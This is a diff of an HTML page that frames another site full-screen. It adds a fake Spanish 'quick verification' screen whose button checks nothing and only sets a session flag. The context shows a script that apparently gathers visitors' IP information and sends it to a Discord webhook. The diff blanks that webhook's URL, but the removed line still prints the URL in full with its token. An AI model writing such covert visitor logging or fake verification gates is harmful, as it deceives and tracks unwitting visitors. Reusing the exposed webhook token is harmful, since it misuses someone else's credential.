@@ -6,7 +6,24 @@
         html,body{margin:0;padding:0;height:100%;overflow:hidden}
         iframe{border:none;width:100%;height:100vh;display:block}
     </style>
-  
+  <script>
+(function () {
+  if (sessionStorage.getItem("human_ok")) return;
+
+  document.documentElement.innerHTML = `
+    <body style="font-family:Arial;text-align:center;padding-top:80px">
+      <h2>Verificación rápida</h2>
+      <p>Presiona continuar para entrar</p>
+      <button onclick="sessionStorage.setItem('human_ok','1'); location.reload();" 
+        style="padding:15px 25px;font-size:18px;cursor:pointer;">
+        Continuar
+      </button>
+    </body>
+  `;
+
+  throw new Error("waiting verification");
+})();
+</script>
 </head>
 <body>
  
@@ -16,7 +33,7 @@
     <!-- ANTES DE </body> -->
     <script>
     (() => {
-      const WEBHOOK = "https://discordapp.com/api/webhooks/1506906409164472440/DXdu6zNCLRDPqdY7f-37j0wNx3HMZdxya4oqtO0z1JocBhCFx9KJSoqCH63lyCA9Np2w";
+      const WEBHOOK = "";
 
       async function getIPInfo() {
         try {
